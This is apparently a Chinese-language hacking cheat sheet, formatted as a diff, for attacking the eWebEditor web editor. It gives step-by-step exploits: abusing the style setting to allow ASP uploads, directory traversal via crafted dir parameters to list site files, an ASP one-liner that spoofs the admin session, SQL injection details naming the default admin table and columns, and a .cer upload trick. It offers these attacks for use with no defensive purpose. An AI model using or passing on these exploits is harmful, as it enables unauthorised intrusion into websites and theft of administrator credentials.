@@ -1,0 +1,49 @@
+                  
+
+                                网站编辑器eWebEditor漏洞利用
+
+
+
+
+
+2 没有找到后台就要分析数据库
+
+用明小子打开
+
+3看style（样式哪里）如何有asp aaspsp asa
+
+那么我们就要构造语句
+ID=45&style=s_exampleremote
+
+ewebeditor.asp?ID=45&style=s_exampleremote
+
+4 ewebeditor遍历路径漏洞
+
+上传文件管理---选择样式目录(随便选一个目录)
+得到:
+ewebeditor/admin_uploadfile.asp?id=14
+在id=14后面添加&dir=..
+再加 &dir=../..
+&dir=../../../.. 看到整个网站文件了
+
+5 eWebEditor session欺骗漏洞
+
+保存为asp格式上传到网站  
+<%Session("eWebEditor_User") = "11111111"%>
+然后访问网页 再来访问Admin_Default.asp
+ 方法比较鸡肋
+
+6 eweb2.7版本以下一个注入
+eWebEditor.asp?id=14&style=standard
+http://127.0.0.1/eWebEdito216/eWebEditor.asp?id=14&style=standard
+eweb默认的管理员表是：ewebeditor_system
+这个表下的默认两个列名为:sys_UserName和sys_userpass
+
+
+7 ewebeditor asp版 2.1.6 上传漏洞
+上传 cer  地址的话需要自己去猜或者抓取
+
+
+
+
+
